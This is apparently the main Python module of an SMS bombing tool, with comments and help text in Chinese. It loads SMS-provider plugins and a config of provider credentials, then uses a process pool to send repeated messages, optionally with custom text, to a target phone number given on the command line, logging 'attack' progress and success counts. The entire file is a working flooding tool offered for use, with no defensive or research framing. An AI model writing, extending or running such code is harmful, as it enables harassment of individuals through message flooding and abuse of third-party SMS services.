# coding=utf-8

import sys
import json
import time
import uuid
import argparse
import requests
import random
import importlib
import multiprocessing
import pkgutil
import plugins
import logging
import coloredlogs

__version__ = '0.0.1'
__author__ = 'iamshellvon@gmail.com'


def setup_logger(name, use_colors=True, verbose=False):
    fmt = '[%(levelname).8s %(asctime)s %(module)s:%(lineno)d] %(message)s'
    datefmt = '%Y-%m-%d %H:%M:%S'
    level = logging.DEBUG if verbose else logging.INFO
    if use_colors:
        coloredlogs.install(level=level, fmt=fmt, datefmt=datefmt)
    else:
        logging.basicConfig(level=level, format=fmt, datefmt=datefmt)
    return logging.getLogger(name)


def load_plugins(namespace):
    return {
        name: importlib.import_module(name)
        for finder, name, ispkg
        in pkgutil.iter_modules(namespace.__path__, namespace.__name__ + '.')
    }


class LoggerMixin(object):
    """https://stackoverflow.com/questions/3375443/cant-pickle-loggers"""

    @property
    def logger(self):
        component = "{}.{}".format(type(self).__module__, type(self).__name__)
        return logging.getLogger(component)


class SmsPlugin(LoggerMixin):
    """短信插件"""
    API_URLS = {
        'send': 'https://von.sh'
    }

    def __init__(self, **kwargs):
        self.auth = kwargs.get('auth', {})
        self.method = kwargs.get('method', 'GET')
        self.api = kwargs.get('api', self.API_URLS['send'])
        self.desc = kwargs.get('desc')
        self.payloads = kwargs.get('payloads', {})
        self.enable_custom_msg = kwargs.get('enable_custom_msg', False)

    def __repr__(self):
        return '<{}:{}>'.format(self.__class__.__name__, self.auth)

    def __str__(self):
        return self.__repr__()

    @property
    def nonce(self):
        return uuid.uuid4().hex

    @property
    def curtime(self):
        return str(int(time.time()))

    def get_msg_content(self, config, key='msg'):
        msg = config.get(key, '您的验证码是: 123456')
        if self.enable_custom_msg:
            return config.get('__custom_msg', msg)
        return msg

    def send(self, mobile, **kwargs):
        self.payloads['mobile'] = mobile
        resp = requests.request(self.method, self.api, data=self.payloads)
        self.logger.info(resp)
        return resp


def worker(*args, **kwargs):
    """
    多进程需要跑的worker.

    :param args:
    :param kwargs:
    :return:
    """
    obj, method_name = args[:2]
    logging.debug(
        '{obj}->{method_name}({args},{kwargs})'.format(obj=type(obj).__name__,
                                                       method_name=method_name,
                                                       args=args[2:],
                                                       kwargs=kwargs))
    return getattr(obj, method_name)(*args[2:], **kwargs)


class SmsBomb(LoggerMixin):
    """短信轰炸机"""

    def __init__(self, plugins, config_lst, target, **kwargs):
        """
        短信轰炸机!!!!
        :param plugins: 插件
        :param config_lst: 配置列表
        :param target: 攻击手机号
        :param kwargs: 其他自定义信息,比如msg/proccess_num/prefix
        """
        self.plugins = plugins
        self.config_lst = config_lst
        self.target = target
        self.limit = kwargs.get('limit', 10)
        self.process_num = kwargs.get('process_num', 5)
        self.custom_msg = kwargs.get('msg', None)
        self.prefix = kwargs.get('prefix', '')
        self.max_allowed_failed_rate = 0.9 # 最大允许的失败率.超过这个失败率之后会宣告失败
        self.failed_config_lst = []

    def _random_weight_select(self):
        weight_lst = [[k, v] for (k,v) in enumerate(self.config_lst) for _ in range(v.get('weight', 1))]
        if weight_lst:
            return random.choice(weight_lst)
        return None

    def re_config(self, config_lst):
        self.config_lst = config_lst
        self.failed_config_lst = []

    def start(self, config_lst=None):
        if config_lst:
            self.re_config(config_lst)
        pool = multiprocessing.Pool(processes=self.process_num)
        start_time = time.clock()
        success_cnt = 0
        failed_cnt = 0
        while success_cnt < self.limit and (failed_cnt / self.limit) <= self.max_allowed_failed_rate:
            index, current_config = self._random_weight_select()
            if not current_config:
                # 如果已经找不到配置了, 尝试把之前错误的配置重新分配,并标记失败次数
                self.logger.warning('没有可用配置可供使用!尝试重置配置列表:%s', self.failed_config_lst)
                self.re_config(self.failed_config_lst)
                failed_cnt += 1
                continue
            key = self.prefix + current_config['product']
            cls = current_config.get('product').title() + 'Plugin'
            obj = self.plugins.get(key)
            if not obj or not hasattr(obj, cls):
                self.logger.warning('无此插件:%s,跳过' % cls)
                continue
            cls = getattr(obj, cls)(**current_config)
            payloads = current_config.get('payloads', {})
            if self.custom_msg:
                payloads['__custom_msg'] = self.custom_msg
            success = pool.apply(worker, args=(
                cls, 'send', self.target), kwds=payloads)
            if success:
                success_cnt += 1
            else:
                self.logger.warning('节点%s请求失败,尝试降低此配置的优先级,并标记此节点已经失败', current_config)
                # 失败,尝试降低修改此配置的优先级,并标记此节点已经失败.
                self.config_lst[index]['weight'] = max(current_config.get('w', 1) - 1, 0)
                # 由于权重原因可能会重复加入到failed_config_lst,
                # 因此这里的权重全设置为1,保证之后权重展开的时候只有一次.
                current_config['weight'] = 1
                self.failed_config_lst.append(current_config)
                failed_cnt += 1
            self.logger.debug('攻击进度(成功数/期望攻击次数): %d/%d = %.2f%%, 实际攻击目标次数(含失败): %d(失败%d次)',
                              success_cnt, self.limit, success_cnt * 100/self.limit, success_cnt+failed_cnt, failed_cnt)

        pool.close()
        pool.join()
        end_time = time.clock()
        self.logger.info(
            '攻击完毕,成功: {0}次, 失败: {1}次,累计耗时: {0:.4f}s'.format(
                success_cnt, failed_cnt, end_time - start_time))


def load_config(cfg, product=None):
    """
    加载配置

    :param cfg: 配置文件完整目录
    :param product: 如果指定了产品则只返回该产品配置否则返回所有配置
    :return:
    """
    with open(cfg, 'rb') as config_file:
        config = json.loads(config_file.read())
    if product:
        return list(filter(lambda x: x['product'] == product, config))
    return config


def main():
    # 插件前缀.
    plugin_prefix = plugins.__name__ + '.'
    # 加载目前已经有的所有短信插件.
    sms_plugins = load_plugins(plugins)
    # 支持的短信服务商.
    __supported_sms_service = [name.replace(
        plugin_prefix, '') for name in sms_plugins.keys()]
    parser = argparse.ArgumentParser(description='短信轰炸机')
    parser.add_argument('-t', '--target', type=int,
                        required=True, help='指定攻击目标手机号')
    parser.add_argument('-n', '--times', type=int,
                        default=10, help='指定攻击次数,默认10')
    parser.add_argument('-p', '--product',
                        choices=__supported_sms_service,
                        type=str,
                        default=None,
                        help='使用指定产品攻击,比如网易netease/云之讯/创蓝253/腾讯云/阿里云')
    parser.add_argument('-c', '--config', type=str,
                        default='config/sms.json', help='指定配置文件')
    parser.add_argument('--process', dest='process_num',
                        type=int, default=5, help='进程数,默认5')
    parser.add_argument('-m', '--message', type=str, help='自定义的消息体,如果支持的话')
    parser.add_argument('-v', '--verbose', default=False,
                        action='store_true', help='详细日志')

    args = parser.parse_args()
    logger = setup_logger(__name__,
                          use_colors=sys.stdout.isatty(),
                          verbose=args.verbose)
    config = load_config(args.config, args.product)
    args.process_num = min(args.process_num, args.times)

    if not config:
        logger.error('短信轰炸机配置不可为空')
        return

    sms_bomb = SmsBomb(sms_plugins, config, args.target,
                       process_num=args.process_num,
                       msg=args.message,
                       limit=args.times,
                       prefix=plugin_prefix
                       )
    sms_bomb.start()


if __name__ == '__main__':
    main()
